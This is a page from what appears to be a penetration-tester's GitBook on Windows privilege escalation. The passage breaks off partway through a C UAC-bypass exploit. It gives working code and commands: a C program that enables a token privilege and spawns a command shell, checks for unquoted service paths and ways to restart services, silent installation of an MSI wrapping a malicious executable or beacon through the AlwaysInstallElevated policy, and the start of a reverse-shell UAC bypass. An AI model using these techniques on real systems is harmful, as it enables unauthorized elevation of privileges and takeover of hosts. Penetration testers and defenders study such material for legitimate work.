
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Windows Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="Linux.html" />
    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <a target="_blank" href="https://twitter.com/OtterHacker">
            
                    
                    Follow On Twitter
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <span>
            
                    
                    Articles
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../../Articles/Articles.html">
            
                <a href="../../../Articles/Articles.html">
            
                    
                    Index
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../../../Articles/Defcon31.html">
            
                <a href="../../../Articles/Defcon31.html">
            
                    
                    Defcon advices
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    Malware
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" >
            
                <span>
            
                    
                    Docs
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1.1" data-path="../../../Malware/Docs/Code snippet.html">
            
                <a href="../../../Malware/Docs/Code snippet.html">
            
                    
                    Code Snippet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.2" data-path="../../../Malware/Docs/Dumpbin.html">
            
                <a href="../../../Malware/Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.3" data-path="../../../Malware/Docs/NTStructure.html">
            
                <a href="../../../Malware/Docs/NTStructure.html">
            
                    
                    NTStructure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.4" data-path="../../../Malware/Docs/Passing arguments.html">
            
                <a href="../../../Malware/Docs/Passing arguments.html">
            
                    
                    Passing Arguments
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2" >
            
                <span>
            
                    
                    Basics
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.1" data-path="../../../Malware/Introduction/0 - Introduction.html">
            
                <a href="../../../Malware/Introduction/0 - Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.2" data-path="../../../Malware/Introduction/1 - PE.html">
            
                <a href="../../../Malware/Introduction/1 - PE.html">
            
                    
                    PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3" data-path="../../../Malware/Introduction/2 - Payload Storage.html">
            
                <a href="../../../Malware/Introduction/2 - Payload Storage.html">
            
                    
                    Payload Storage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4" data-path="../../../Malware/Introduction/3 - Payload Encryption.html">
            
                <a href="../../../Malware/Introduction/3 - Payload Encryption.html">
            
                    
                    Payload Encryption
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.5" data-path="../../../Malware/Introduction/4 - Function Call Obfuscation.html">
            
                <a href="../../../Malware/Introduction/4 - Function Call Obfuscation.html">
            
                    
                    Function Call Obfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.6" data-path="../../../Formation/RTO - Malware Development/5 - Backdooring PE.md">
            
                <span>
            
                    
                    Backdooring PE
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.3" >
            
                <span>
            
                    
                    EDR
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.3.1" data-path="../../../Malware/EDR/TrendMicro.html">
            
                <a href="../../../Malware/EDR/TrendMicro.html">
            
                    
                    TrendMicro
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3.2" data-path="../../../Malware/EDR/Elastic EDR.html">
            
                <a href="../../../Malware/EDR/Elastic EDR.html">
            
                    
                    Elastic EDR
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.4.1" data-path="../../../Malware/CoffLoader.html">
            
                <a href="../../../Malware/CoffLoader.html">
            
                    
                    COFF Loader
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.2" data-path="../../../Malware/ETW.html">
            
                <a href="../../../Malware/ETW.html">
            
                    
                    ETW
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.3" data-path="../../../Malware/Function hooking.html">
            
                <a href="../../../Malware/Function hooking.html">
            
                    
                    Function Hooking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.4" data-path="../../../Malware/Kernel callback.html">
            
                <a href="../../../Malware/Kernel callback.html">
            
                    
                    Kernel Callback
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.5" data-path="../../../Malware/Module stomping.html">
            
                <a href="../../../Malware/Module stomping.html">
            
                    
                    Module Stomping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.6" data-path="../../../Malware/Remote DLL Injection.html">
            
                <a href="../../../Malware/Remote DLL Injection.html">
            
                    
                    Remote DLL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.7" data-path="../../../Malware/Reflective DLL injection.html">
            
                <a href="../../../Malware/Reflective DLL injection.html">
            
                    
                    Reflective DLL Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.5" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.5.1" data-path="../../../Malware/Docs/Tools/IDA.html">
            
                <a href="../../../Malware/Docs/Tools/IDA.html">
            
                    
                    IDA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5.2" data-path="../../../Malware/Docs/Tools/Radare2.html">
            
                <a href="../../../Malware/Docs/Tools/Radare2.html">
            
                    
                    R2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" >
            
                <span>
            
                    
                    Pentest
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" >
            
                <span>
            
                    
                    Cloud
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1.1" data-path="../../Cloud/AWS.html">
            
                <a href="../../Cloud/AWS.html">
            
                    
                    AWS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.1.2" data-path="../../Cloud/Azure.html">
            
                <a href="../../Cloud/Azure.html">
            
                    
                    Azure
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.2" >
            
                <span>
            
                    
                    Configuration Review
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.2.1" data-path="../../Configuration review/Database.html">
            
                <a href="../../Configuration review/Database.html">
            
                    
                    Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2.2" data-path="../../Configuration review/Kubernetes.html">
            
                <a href="../../Configuration review/Kubernetes.html">
            
                    
                    Kubernetes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2.3" data-path="../../Configuration review/KubernetesCIS.html">
            
                <a href="../../Configuration review/KubernetesCIS.html">
            
                    
                    KubernetesCIS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.3" >
            
                <span>
            
                    
                    Services
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.3.1" data-path="../../Services/AD.html">
            
                <a href="../../Services/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.2" >
            
                <span>
            
                    
                    Databases
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.3.2.1" data-path="../../Services/Oracle database.html">
            
                <a href="../../Services/Oracle database.html">
            
                    
                    Oracle Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.2.2" data-path="../../Services/MSSQL.html">
            
                <a href="../../Services/MSSQL.html">
            
                    
                    MSSQL
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.3.3" data-path="../../Services/DNS.html">
            
                <a href="../../Services/DNS.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.4" data-path="../../Services/IPMI.html">
            
                <a href="../../Services/IPMI.html">
            
                    
                    IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.5" data-path="../../Services/Kerberos.html">
            
                <a href="../../Services/Kerberos.html">
            
                    
                    Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.6" data-path="../../Services/LDAP.html">
            
                <a href="../../Services/LDAP.html">
            
                    
                    LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.7" data-path="../../Services/Memcached.html">
            
                <a href="../../Services/Memcached.html">
            
                    
                    Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.8" data-path="../../Services/NFS.html">
            
                <a href="../../Services/NFS.html">
            
                    
                    NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.9" data-path="../../Services/RPC.html">
            
                <a href="../../Services/RPC.html">
            
                    
                    RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.10" data-path="../../Services/SMB.html">
            
                <a href="../../Services/SMB.html">
            
                    
                    SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.11" data-path="../../Services/SNMP.html">
            
                <a href="../../Services/SNMP.html">
            
                    
                    SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.12" data-path="../../Services/Tomcat.html">
            
                <a href="../../Services/Tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.13" data-path="../../Services/WebDAV.html">
            
                <a href="../../Services/WebDAV.html">
            
                    
                    WebDAV
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.4.1" data-path="../ADCS abuses.html">
            
                <a href="../ADCS abuses.html">
            
                    
                    Abuse ADCS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.2" data-path="../Abuse tokens.html">
            
                <a href="../Abuse tokens.html">
            
                    
                    Abuse Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.3" data-path="../Trusts abuses.html">
            
                <a href="../Trusts abuses.html">
            
                    
                    Abuse Trusts
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.4" data-path="../Buffer overflow.html">
            
                <a href="../Buffer overflow.html">
            
                    
                    Buffer Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.5" data-path="../Command injection.html">
            
                <a href="../Command injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.6" data-path="../Data exfiltration.html">
            
                <a href="../Data exfiltration.html">
            
                    
                    Data Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.7" data-path="../DPAPI.html">
            
                <a href="../DPAPI.html">
            
                    
                    DPAPI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.8" data-path="../Exploit handles.html">
            
                <a href="../Exploit handles.html">
            
                    
                    Exploit handles
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.9" data-path="../Filtering.html">
            
                <a href="../Filtering.html">
            
                    
                    Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.10" data-path="../Kioske escape.html">
            
                <a href="../Kioske escape.html">
            
                    
                    Kioske Escape
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.11" data-path="../LFI.html">
            
                <a href="../LFI.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.12" data-path="../Password spraying.html">
            
                <a href="../Password spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.13" data-path="../Pivoting.html">
            
                <a href="../Pivoting.html">
            
                    
                    Pivoting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.14" >
            
                <span>
            
                    
                    Privilege Escalation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.5.4.14.1" data-path="Windows.html">
            
                <a href="Windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.14.2" data-path="Linux.html">
            
                <a href="Linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.4.15" data-path="../Reverse shell.html">
            
                <a href="../Reverse shell.html">
            
                    
                    Reverse Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.16" data-path="../Scrapping.md">
            
                <span>
            
                    
                    Scrapping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.17" data-path="../Shellshock.html">
            
                <a href="../Shellshock.html">
            
                    
                    Shellshock
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.18" data-path="../SQL injection.html">
            
                <a href="../SQL injection.html">
            
                    
                    SQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.19" data-path="../SSTI.html">
            
                <a href="../SSTI.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.5" >
            
                <span>
            
                    
                    Technology
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.5.1" data-path="../../Technology/AD.html">
            
                <a href="../../Technology/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.2" data-path="../../Technology/IOS.html">
            
                <a href="../../Technology/IOS.html">
            
                    
                    IOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.3" data-path="../../Technology/NAC.html">
            
                <a href="../../Technology/NAC.html">
            
                    
                    NAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.4" data-path="../../Technology/Port Knocking.html">
            
                <a href="../../Technology/Port Knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.5" data-path="../../Technology/SAML.html">
            
                <a href="../../Technology/SAML.html">
            
                    
                    SAML
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.6" data-path="../../Technology/SAP.html">
            
                <a href="../../Technology/SAP.html">
            
                    
                    SAP
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.6" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.6.1" data-path="../../Tools/BloundHound.html">
            
                <a href="../../Tools/BloundHound.html">
            
                    
                    BloundHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.2" data-path="../../Tools/CME.html">
            
                <a href="../../Tools/CME.html">
            
                    
                    CME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.3" data-path="../../Tools/Curl.html">
            
                <a href="../../Tools/Curl.html">
            
                    
                    Curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.4" data-path="../../Tools/Ffuf.html">
            
                <a href="../../Tools/Ffuf.html">
            
                    
                    FFUF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.5" data-path="../../Tools/Find.html">
            
                <a href="../../Tools/Find.html">
            
                    
                    Find
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.6" data-path="../../Tools/Hydra.html">
            
                <a href="../../Tools/Hydra.html">
            
                    
                    Hydra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.7" data-path="../../Tools/PowerView.html">
            
                <a href="../../Tools/PowerView.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.8" data-path="../../Tools/Powershell.html">
            
                <a href="../../Tools/Powershell.html">
            
                    
                    Powershell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.9" data-path="../../Tools/Responder.html">
            
                <a href="../../Tools/Responder.html">
            
                    
                    Responder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.10" data-path="../../Tools/Rubeus.html">
            
                <a href="../../Tools/Rubeus.html">
            
                    
                    Rubeus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.11" data-path="../../Tools/Strace.html">
            
                <a href="../../Tools/Strace.html">
            
                    
                    Strace
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.12" data-path="../../Tools/Wfuzz.html">
            
                <a href="../../Tools/Wfuzz.html">
            
                    
                    Wfuzz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" >
            
                <span>
            
                    
                    Rainy Sunday
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../../../Serveur/Proxmox/Intel Killer AX1650.html">
            
                <a href="../../../Serveur/Proxmox/Intel Killer AX1650.html">
            
                    
                    Killer AX1650
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="../../../Serveur/KMS/KMS.html">
            
                <a href="../../../Serveur/KMS/KMS.html">
            
                    
                    KMS Activation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="../../../Serveur/LicenceKey.html">
            
                <a href="../../../Serveur/LicenceKey.html">
            
                    
                    Licence Key
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >Windows</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="windows">Windows</h1>
<h1 id="table-of-content">Table of content</h1>
<!-- toc -->
<ul>
<li><a href="#enable-a-disabled-privilege">Enable a disabled privilege</a></li>
<li><a href="#unquoted-services-path">Unquoted services path</a></li>
<li><a href="#always-install-enabled">Always Install Enabled</a></li>
<li><a href="#uac-bypass-win10">UAC-bypass (WIN10)</a></li>
<li><a href="#churrasco">Churrasco</a></li>
<li><a href="#ms08-067">MS08-067</a></li>
<li><a href="#windows-xp">Windows XP</a><ul>
<li><a href="#sp1">SP1</a></li>
</ul>
</li>
<li><a href="#ressources">Ressources</a></li>
<li><a href="#ressources-1">Ressources</a></li>
</ul>
<!-- tocstop -->
<h1 id="enable-a-disabled-privilege">Enable a disabled privilege</h1>
<p>Any disabled privilege can be re-enabled by the user.</p>
<pre><code class="lang-powershell">Import-Module ./PowerUp.ps1; EnablePrivilege -Privilege ${privilegeName}

<span class="hljs-comment"># Import-Module ./PowerUp.ps1; EnablePrivilege -Privilege SeBackupPrivilege</span>
</code></pre>
<p>The following <code>C</code> code can be used to enable a disabled privilege:</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
&#x200B;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">bEnablePrivilege</span><span class="hljs-params">(<span class="hljs-literal">true</span>)</span></span>;
    <span class="hljs-function">HANDLE <span class="hljs-title">hToken</span><span class="hljs-params">(<span class="hljs-literal">NULL</span>)</span></span>;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
&#x200B;
    <span class="hljs-keyword">if</span> (!LookupPrivilegeValue(
        <span class="hljs-literal">NULL</span>,                       <span class="hljs-comment">// lookup privilege on local system</span>
        <span class="hljs-string">L&quot;SeLoadDriverPrivilege&quot;</span>,   <span class="hljs-comment">// privilege to lookup </span>
        &amp;luid))                     <span class="hljs-comment">// receives LUID of privilege</span>
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LookupPrivilegeValue error: %un&quot;</span>, GetLastError());
        <span class="hljs-keyword">return</span> FALSE;
    }
    tp.PrivilegeCount = <span class="hljs-number">1</span>;
    tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;

    <span class="hljs-keyword">if</span> (bEnablePrivilege) {
        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;
    }

    <span class="hljs-comment">// Enable the privilege or disable all privileges.</span>
    <span class="hljs-keyword">if</span> (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &amp;tp,
        <span class="hljs-keyword">sizeof</span>(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)<span class="hljs-literal">NULL</span>,
        (PDWORD)<span class="hljs-literal">NULL</span>))
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AdjustTokenPrivileges error: %x&quot;</span>, GetLastError());
        <span class="hljs-keyword">return</span> FALSE;
    }
&#x200B;
    system(<span class="hljs-string">&quot;cmd&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h1 id="unquoted-services-path">Unquoted services path</h1>
<p>If a service is configured to launch a binary whose path contains space such as <code>C:\Program Files\Directory Exemple\binary.exe</code> without any quotes arround, <code>Windows</code> will try to lauch the executables locating at the following path :</p>
<pre><code>C:\Program.exe
C:\Program Files\Directory.exe
C:\Program Files\Directory Exemple\binary.exe
</code></pre><p>Thus, if binaries are present in either <code>C:\Program.exe</code> or <code>C:\Program Files\Directory.exe</code> they will be launched instead of the real service binary.</p>
<p>This vulnerability can be checked with the following command:</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># CMD only</span>
wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;
</span></code></pre>
<p>The service information can be checked with:</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># CMD only</span>
sc qc ${serviceName}

<span class="hljs-comment"># SERVICE_NAME: DusmSvc</span>
<span class="hljs-comment">#         TYPE               : 10  WIN32_OWN_PROCESS</span>
<span class="hljs-comment">#         START_TYPE         : 2   AUTO_START</span>
<span class="hljs-comment">#         ERROR_CONTROL      : 1   NORMAL</span>
<span class="hljs-comment">#         BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p</span>
<span class="hljs-comment">#         LOAD_ORDER_GROUP   : TDI</span>
<span class="hljs-comment">#         TAG                : 0</span>
<span class="hljs-comment">#         DISPLAY_NAME       : Data Usage</span>
<span class="hljs-comment">#         DEPENDENCIES       : RpcSs</span>
<span class="hljs-comment">#         SERVICE_START_NAME : NT Authority\LocalService</span>
</code></pre>
<p>If <code>START_TYPE</code> is <code>AUTO_START</code> the service will be automaticaly launched during the boot.</p>
<p>To restart a service:</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># CMD only</span>
sc stop ${serviceName} &amp;&amp; sc start ${serviceName}
net stop ${serviceName} &amp;&amp; net start ${serviceName}
</code></pre>
<h1 id="always-install-enabled">Always Install Enabled</h1>
<p>This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to grant <code>Administrator</code> rights to the installer process.</p>
<p>It can be checked on the following registry key:</p>
<pre><code>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
</code></pre><p>Then, create an <code>MSI</code> installer with <code>VisualStudion</code>:</p>
<pre><code>Create New Project &gt; Setup Wizard
</code></pre><p>Keep clicking <code>Next</code> until the step <code>Choose File To Include</code>. Then add your malicious executable. Then, click <code>Finish</code>.</p>
<p>Once the project is loaded, go to <code>View &gt; Custom Action</code>, right click on <code>Install</code> and then <code>Add Custom Action</code>. Double click on <code>Applicatioin Folder</code> and select your malicious executable and click <code>Ok</code>.  Likewise, under <code>Custom Action Runtime</code>, select the appropriate plateform. It will ensure that your executable is launched when the <code>MSI</code> installer is run.</p>
<p>Then install the <code>MSI</code> with the following command:</p>
<pre><code class="lang-cmd">msiexec /q /n /i Installer.msi
</code></pre>
<p>To uninstalll the <code>MSI</code> once the exploit has be launched, run the following command:</p>
<pre><code class="lang-cmd">msiexec /q /n /uninstall Installer.msi
</code></pre>
<blockquote>
<p>When this technique is used to launch a beacon, the beacon will block the <code>Windows Installer</code>. In this case, you should inject the beacon in another process, kill the beacon running from the <code>Windows Installer</code> and then uninstall the <code>MSI</code> package used.</p>
</blockquote>
<h1 id="uac-bypass-win10">UAC-bypass (WIN10)</h1>
<p>The following executable can be used to launch a reverse shell bypassing the <code>UAC</code>.</p>
<pre><code class="lang-c"><span class="hljs-comment">// Compile on Kali with : x86_64-w64-mingw32-gcc exploit.c -o exploit.exe</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-comment">/*
 * Pretty standard code to recursively nuke a Reg Key
 */</span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">RegDelnodeRecurse</span> <span class="hljs-params">(LPTSTR lpSubKey)</span> </span>{
    LPTSTR lpEnd;
    LONG lResult;
    DWORD dwSize = MAX_PATH;
    TCHAR szName[MAX_PATH];
    HKEY hKey;
    FILETIME ftWrite;

    lResult = RegDeleteKey(HKEY_CURRENT_USER, lpSubKey);

    <span class="hljs-keyword">if</span> (lResult == ERROR_SUCCESS) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;

    lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, <span class="hljs-number">0</span>, KEY_READ, &amp;hKey);

    <span class="hljs-keyword">if</span> (lResult != ERROR_SUCCESS) <span class="hljs-keyword">return</span> lResult == ERROR_FILE_NOT_FOUND;

    lpEnd    = lpSubKey + lstrlen(lpSubKey);
    *lpEnd++ = <span class="hljs-string">&apos;\\&apos;</span>;
    *lpEnd   = <span class="hljs-string">&apos;\0&apos;</span>;

    <span class="hljs-keyword">if</span> (RegEnumKeyEx(hKey, <span class="hljs-number">0</span>, szName, &amp;dwSize, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;ftWrite) == ERROR_SUCCESS) {
        <span class="hljs-keyword">do</span> {
            <span class="hljs-built_in">strcpy</span>(lpEnd, szName);
